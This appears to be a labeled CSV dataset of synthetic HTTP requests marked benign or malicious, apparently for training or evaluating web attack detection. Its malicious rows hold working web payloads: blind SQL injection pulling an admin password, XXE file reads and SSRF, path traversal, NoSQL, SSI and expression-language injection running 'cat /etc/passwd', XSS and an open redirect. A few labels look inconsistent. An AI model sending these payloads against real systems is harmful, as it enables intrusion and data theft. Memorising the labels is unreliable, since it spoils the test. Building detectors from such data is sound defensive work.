label,text
malicious,"POST /user/profile/update HTTP/1.1
Host: www.modern-fashionshop.biz
Connection: keep-alive
Content-Length: 27
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://www.modern-fashionshop.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; tracking_id=abc123';/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61,SLEEP(5),0)#; preference=en-US

email=john.doe%40hotmail.com&notify=on"
malicious,"GET /user/profile HTTP/1.1
Host: auth-portal-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: session_filter=(uid=admin%00
Connection: keep-alive"
benign,"PUT /v1/data/preference/encode HTTP/1.1
Host: data-streaming-hub.tech
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.fakejwt.token.example
Content-Type: application/json
Accept: application/json
User-Agent: python-requests/2.28.2
Content-Length: 120
Connection: keep-alive

{""user_preferences_b64"":""eyJjb2xvciI6ICJsaWdodGJsdWUiLCAidGl0bGUiOiAiRmllbGQgc2V0dGluZ3MgaW4gIFBsYWNlIiwiZm9udCI6ICJBcmlhbCJ9""}"
benign,"GET /api/v2/weather?location=Seattle&callback=processData HTTP/1.1
Host: regional-weather-station.net
Accept: application/javascript, */*;q=0.9
User-Agent: curl/7.77.0
Accept-Encoding: gzip, deflate"
benign,"POST /api/v3/login/authenticate HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Connection: close
User-Agent: curl/7.79.1
Accept: */*

username=jane.doe&password=pa%23ss%26word123&remember_me=true"
benign,"GET /accounts/profile?id=8 HTTP/1.1
Host: enterprise-dashboard.net
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: close
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36"
malicious,"GET /fetch_remote?url=https://127.0.0.1:8443/secure/admin HTTP/1.1
Host: app-profile-manager.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Chromium"";v=""92"", ""Google Chrome"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Accept-Encoding: gzip, deflate"
benign,"GET /resource/load?path=images/gallery/event_spring2024/banner.jpg HTTP/1.1
Host: creative-media-archive.ai
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://creative-media-archive.ai/gallery/event_spring2024 HTTP/1.1
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"GET /proxy?target=http://192.168.1.250/configuration HTTP/1.1
Host: api.fastcontent-delivery.biz
User-Agent: curl/7.76.0
Accept: */*
Referer: https://dashboard.fastcontent-delivery.biz/workspace
Connection: close"
benign,"POST /account/create HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Referer: https://secure-user-portal.net/signup
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Cookie: csrftoken=3a8x0k9evnjt403h9u39yv; session_token=eyJhbGci
Connection: keep-alive

username=ryan_clarkson&email=ryan.clarkson%40secureuser.io&password=BlueSkies22&password_confirm=BlueSkies22&terms_accepted=true"
malicious,"POST /v3/checkout/confirm HTTP/1.1
Host: secure-checkout-service.ai
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br
Origin: https://secure-checkout-service.ai
Cache-Control: no-cache
Content-Length: 61
Cookie: auth_token=v9r83snvuf9fj2iweiuw

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"POST /login HTTP/1.1
Host: user-access-management.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://user-access-management.io
Referer: https://user-access-management.io/login
Cookie: sessionid=9f82b7d3a6e5c2d1; csrf_token=a3f67d8291bc4e0f
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

username=jordan.mills&password=LoVeToRun2024"
benign,"GET /swagger/v2/api-docs.json HTTP/1.1
Host: digital-healthcare-solutions.info
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip
Connection: keep-alive"
benign,"GET /features/education/online-learning-platform-review HTTP/1.1
Host: edutech-review.net
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html,application/xml;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /account/update HTTP/1.1
Host: digital-media-portfolio.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: text/plain
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Cookie: dm_sess=1a2b3c4d5e6f7g8h9i0j
Content-Length: 90

user%5Bemail%5D=artist%40digital-media-portfolio.net&user%5Bprofile%5D%5Bverified%5D=true&user%5Broles%5D%5B%5D=30&user%5Broles%5D%5B%5D=31"
benign,"POST /polls/submit HTTP/1.1
Host: your-voice.vote
User-Agent: curl/7.85.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: https://your-voice.vote
Referer: https://your-voice.vote/polls/22

poll_id=22&vote_option=C"
benign,"GET /dashboard/widgets/chart.js HTTP/1.1
Host: prism-cloud-services.com
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/javascript, */*;q=0.05
Referer: https://prism-cloud-services.com/dashboard"
benign,"PUT /api/blog/posts/542 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer gG12hiYXCVbnEWZmAWu196AQOSRfzpgD4yHdTlFS
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive

{""id"":542,""title"":""Exploring Rust for Web Development"",""slug"":""exploring-rust-for-web"",""content"":""This article walks through getting started with Rust in web apps, including tooling and examples."",""tags"":[""rust"",""webdev"",""programming""],""published"":true}"
benign,"POST /auth/login HTTP/1.1
Host: portal.tech-solutions-group.de
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Connection: keep-alive
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0

username=elisabeth.schmidt&password=Berlin2024!&callback=/user/account/security-settings"
malicious,"GET /download?doc=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afvar%c0%afwww%c0%afhtml%c0%afindex.html HTTP/1.1
Host: docs.my-personal-blog-site.info
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: deflate, gzip
Connection: keep-alive"
benign,"GET /dashboard HTTP/1.1
Host: secure-user-portal.net
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: auth_data_b64=eyJ1c2VySWQiOiI1NjciLCJyb2xlcyI6WyJhZG1pbiIsInVzZXIiXX0=; theme=darkmode
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
benign,"GET /library/fall_2023_journal_issue.pdf HTTP/1.1
Host: community-literature-online.org
Accept: application/pdf
Referer: https://community-literature-online.org/library/archive
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0
Connection: keep-alive"
malicious,"POST /upload/processDocument HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml, text/html, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Origin: https://api.cloud-data-services.ai
Content-Type: multipart/form-data; boundary=----BoundaryMobile321
Content-Length: 460

------BoundaryMobile321
Content-Disposition: form-data; name=""description""

User config upload
------BoundaryMobile321
Content-Disposition: form-data; name=""file""; filename=""userconfig.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------BoundaryMobile321--"
benign,"GET /api/v3/movies/search?title=award+winning+drama+exploring+themes+of+family+legacy+loss+and+reconciliation+set+against+the+backdrop+of+rural+Japan HTTP/1.1
Host: cineverse-streaming.net
User-Agent: python-requests/2.28.1
Accept: application/json, text/plain, */*
Connection: keep-alive"
malicious,"POST /api/v2/register HTTP/1.1
Host: api-newsevent-hub.net
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Accept-Language: en-GB,en;q=0.9
Cache-Control: no-cache
Referer: https://api-newsevent-hub.net/signup

username=jessica&rdata_b64=cHJvZHVjdF9pZD0zMDA7IFVOVEFURSAgU0VMRUNUIDEyMyBEUk9QIFRBQkxFIGVzIHRlc3RzOyAtLQ=="
benign,"GET /v2/api-docs HTTP/1.1
Host: analytics-integration-platform.ai
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Connection: keep-alive
X-Requested-With: XMLHttpRequest"
benign,"GET /blog/post/view?id=2024-04-15+review+""organic+gardening""&author=Jane+O%27Connor HTTP/1.1
Host: green-thumb-gardeners.org
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Referer: https://green-thumb-gardeners.org/blog
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: close"
benign,"GET /media/images/banner.png HTTP/1.1
Host: marketing-assets-server.biz
X-Forwarded-For: 192.168.0.88
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://marketing-assets-server.biz/campaign/summer-sale
Connection: keep-alive"
benign,"GET /product/beauty/skincare/face-serums/904 HTTP/1.1
Host: pure-beauty-supply.info
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.8
Referer: https://pure-beauty-supply.info/products/beauty/skincare
Cookie: sid=bf2c9f7351d9a; cartSessionId=cart01478bd0c2
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Mobile Safari/537.36"
benign,"POST /user/session/logout HTTP/1.1
Host: photoshare-gallery.net
Connection: keep-alive
Referer: https://photoshare-gallery.net/user/settings
Cookie: gallery_sid=fn2qb6t2a7m2z8c9o481pg7p9e
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 0"
benign,"POST /user/authenticate HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqb2huZG9lIiwiaWF0IjoxNjg3MDQ3MjAwfQ.x7CZ0L0MtPWyL-Efsbk88YEnk0IX4DOE-5BdgNKEuFY
X-Requested-With: XMLHttpRequest
User-Agent: curl/7.86.0
Content-Length: 61

{""username"":""john_doe"",""password"":""Winter2024$""}"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: cloud-sync-services.io
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Content-Type: application/json-patch+json
Content-Length: 47
Connection: keep-alive

[{""op"": ""replace"", ""path"": ""/sync/frequency"", ""value"": ""daily""}]"
benign,"GET /products/fitness-equipment/treadmills/variable-speed-320-model HTTP/1.1
Host: activefit-sportsgear.ai
Connection: close
Accept: text/html
Referer: https://activefit-sportsgear.ai/category/fitness-equipment
Accept-Language: en-GB,en;q=0.9
Cookie: sid=4dc1f11e453b10a9; cart=045edcc5f8952a3d
User-Agent: Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36"
benign,"PATCH /api/documents/7f94ac345932c/edit HTTP/1.1
Host: api.secure-docflow.net
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhIjoiMTIzNDU2Nzg5In0.Gzt8afD9i5kaN
Content-Type: application/json
Accept: application/json
User-Agent: python-requests/2.28.2
Content-Length: 51
Connection: keep-alive

{""metadata"":{""lastEditedBy"":""olivia.kim"",""reviewed"":true}}"
benign,"GET /api/v3/items/search?filter=brand%3D%22Eco%26Fresh%22&sort=popularity HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: python-requests/2.28.2
Accept: application/json
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
malicious,"POST /webhook/process HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.68.0
Content-Type: application/xml
Accept: */*
Content-Length: 176
Cache-Control: no-cache

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://192.168.0.12:9000/private"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>"
malicious,"GET /app/account/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-User-Filter: {""$where"": ""if(this.isAdmin){var start=new Date();while((new Date())-start<5000){};}return true;""}
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Content-Length: 39
Origin: https://online-retail-store.biz
Connection: keep-alive

{""filePath"": ""/home/admin/.bash_history""}"
malicious,"POST /member/settings/update HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Referer: https://api.cloud-data-services.ai/member/settings
Connection: close

username=user123&action=save&comment=review_ok&username=adminuser&action=delete&comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
benign,"POST /api/user/newsletter HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
User-Agent: python-requests/2.28.1
Accept: application/json
X-Forwarded-For: 198.51.100.23
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Referer: https://api.cloud-data-services.ai/docs
Connection: keep-alive

email=ethan.brooks%40cloud-data-services.ai"
benign,"GET /articles/health-and-wellness/mental-health-trends-2024 HTTP/1.1
Host: wellbeing-tier3.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xml;q=0.6
Cache-Control: max-age=1200
Connection: keep-alive"
benign,"POST /submission/form HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
User-Agent: curl/7.87.0
Accept: */*
Connection: close
X-Forwarded-For: 198.51.100.23

updates[]=daily&updates[]=weekly&preferred_contact=email"
benign,"POST /forgot_password HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
User-Agent: curl/7.88.1
Accept: */*
Connection: close
Referer: https://online-retail-store.biz/account/login
Origin: https://online-retail-store.biz

email=emily.rivers%40onlineretail.biz"
benign,"DELETE /v1/customers/23456 HTTP/1.1
Host: online-retail-store.biz
Authorization: Basic YWRtaW46c2VjdXJlMTIzHA==
If-Match: ""9f8e7d6c5b""
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/113.0.0.0
Referer: https://online-retail-store.biz/dashboard
Connection: close"
benign,"GET /fetchMetadata?url=https%3A%2F%2Fnews-aggregator-multilingual.com%2Fes%2Fnoticias%2Feconomia%2F2024 HTTP/1.1
Host: news-aggregator-multilingual.com
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1
Connection: keep-alive
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"
benign,"GET /software/patches/v2.8.4/update.bin HTTP/1.1
Host: tech-support-downloads.net
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Range: bytes=0-1023
Accept: application/octet-stream
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /api/v5/profile/details/7ec9d99 HTTP/1.1
Host: fast-track-payments.io
Accept: application/json
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET / HTTP/1.1
Host: daily-courier.news
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://www.bing.com/
Accept-Language: en-US,en;q=0.5
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0"
malicious,"GET /app/user/settings HTTP/1.1
Host: control-panel.dynamic-content.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 <!--#config errmsg=""SSI_Error_Triggered_Successfully""-->
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"PUT /api/library/books/6438 HTTP/1.1
Host: digital-book-loft.info
Authorization: Bearer fKztL30sdR38kMC0byYGqPhTkgxSC19ejewBoULyxN0
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.87.0
Content-Length: 293

{""bookId"":6438,""title"":""The Art of Urban Gardening"",""author"":""Mercedes Tanaka"",""publishedYear"":2021,""genres"":[""horticulture"",""urban lifestyle""],""availability"":{""digital"":true,""print"":true,""audiobook"":false},""metadata"":{""pages"":322,""isbn"":""978-1-4028-9462-6""}}"
benign,"GET /events/upcoming/june-tech-conference HTTP/1.1
Host: techconnect-events.com
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
If-None-Match: ""a12b34c56d""
Accept-Language: en
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /documents/view?file=report-final.pdf HTTP/1.1
Host: digital-library-resource.org
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Referer: https://digital-library-resource.org/documents/list
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive"
benign,"POST /blog/post/comment HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
Content-Length: 37
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
X-CSRF-Token: a935f4ed7f9a1b49ecb1c3f9a2b8eefd

{""UNION ALL"": ""nice article, thanks""}"
benign,"GET /v1/user/notifications/unread-count HTTP/1.1
Host: notifications-service.my-personal-blog-site.info
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer ea3b2c4e637b482d9d8c56f6884e5caf
Origin: https://my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Language: en-US,en;q=0.5
Pragma: no-cache"
benign,"GET /gallery/%D7%A0%D7%95%D7%A1%D7%A4%D7%99%D7%95%D7%AA?year=2023 HTTP/1.1
Host: art-collectors-israel.co.il
Accept: text/html,application/xhtml+xml
Referer: https://art-collectors-israel.co.il/
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept-Language: he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive"
benign,"GET /forum/threads/list?category=game-development&status=open&tags=multiplayer&tags=unity&sort=last_active_desc&min_replies=5&max_replies=50&page=7&per_page=25&lang=en&user_level=moderator&view_mode=compact HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0"
malicious,"POST /api/v3/orders/create HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: application/json, text/html, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Origin: https://online-retail-store.biz
Content-Length: 291

{""order_id"":null,""items"":[{""sku"":""ABC123"",""qty"":1}],""custom_greeting"":""Hello ${'user'.toUpperCase()} ${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd').getInputStream().readAllBytes()?new('java.lang.String',_)}!""}"
benign,"GET /favicon.ico HTTP/1.1
Host: green-urban-solutions.biz
Connection: keep-alive
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9"
benign,"POST /signin HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/signin
Cookie: session_id=retail74920; csrf_token=def4581693a8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36

email=amy.lopez%40mailretail.biz&password=Shop4Fun+2024"
malicious,"GET /app/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml
Referer: https://dashboard.api.cloud-data-services.ai/home
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"PUT /community/profiles/ismael/update HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: application/json
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 101
Referer: https://community.game-dev-forum.org/profiles/ismael
Connection: keep-alive
Cookie: session=8f1d356bc029a4d5e9f9d2cd4adc7a3d

{""user"": {""nickname"": ""IsmaelD"", ""bio"": ""Game designer &lt;3 Pixel art &amp; retro styles.""}}"
benign,"POST /user/import HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: text/csv
Content-Length: 72
Cache-Control: no-cache
Connection: close
Cookie: session_token=mgk4f87ihd24feo3h

username,email,signup_date
janedoe,jane.doe@mailservice.info,2023-12-15
jacksmith,jack.smith@mailservice.info,2024-01-09"
benign,"DELETE /api/v1/photos/3a5e4cbd HTTP/1.1
Host: creative-portfolio-site.org
Authorization: Bearer mktPLJ87SxuzHD039JjD
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: close"
benign,"GET /static/js/main.3e7f9b2c.chunk.js HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: application/javascript, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Cache-Control: max-age=86400
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
benign,"GET /community/game-dev-forum/topics/4521 HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Cookie: forum_session=53fldjud98fjs; logged_in=yes; user_theme=dark;
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9"
